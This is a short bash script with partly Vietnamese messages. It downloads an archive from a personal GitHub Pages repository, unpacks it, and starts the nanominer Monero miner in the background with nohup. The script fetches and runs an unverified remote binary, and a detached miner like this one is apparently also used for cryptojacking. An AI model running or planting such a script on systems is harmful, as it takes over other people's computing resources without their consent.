#!/bin/bash
echo "Download tool"
wget https://github.com/quyendang/quyendang.github.io/raw/master/a.tar.gz
tar xvzf a.tar.gz
cd a
echo "Chay Tool"
nohup ./nanominer config_xmr.ini &